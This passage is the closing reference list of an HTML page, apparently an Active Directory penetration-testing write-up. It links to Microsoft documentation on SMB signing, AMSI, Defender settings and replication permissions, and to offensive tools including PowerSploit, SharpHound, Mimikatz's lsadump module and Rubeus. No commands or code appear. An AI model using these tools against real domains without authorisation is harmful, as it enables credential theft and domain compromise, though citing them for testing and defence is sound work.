<li><a href="https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-signing-overview">Microsoft — SMB signing</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Microsoft — Antimalware Scan Interface</a></li>
<li><a href="https://powersploit.readthedocs.io/en/latest/Privesc/Invoke-PrivescAudit/">PowerSploit — Invoke-PrivescAudit</a></li>
<li><a href="https://powersploit.readthedocs.io/en/latest/Privesc/Install-ServiceBinary/">PowerSploit — Install-ServiceBinary</a></li>
<li><a href="https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference">Microsoft — Set-MpPreference</a></li>
<li><a href="https://github.com/SpecterOps/SharpHound">SpecterOps — SharpHound collector</a></li>
<li><a href="https://bloodhound.specterops.io/collect-data/ce-collection/sharphound">SpecterOps — SharpHound Community Edition documentation</a></li>
<li><a href="https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/domain-join-networking-errors">Microsoft — domain-controller discovery and networking</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers">Microsoft — security identifiers and well-known RIDs</a></li>
<li><a href="https://learn.microsoft.com/en-us/windows/win32/adschema/r-ds-replication-get-changes-all">Microsoft — secret-data replication permission</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz">Mimikatz — official project</a></li>
<li><a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump">Mimikatz — lsadump module</a></li>
<li><a href="https://github.com/GhostPack/Rubeus">Rubeus — official project and command documentation</a></li>
</ul>


</section>
</div>
{% endraw %}
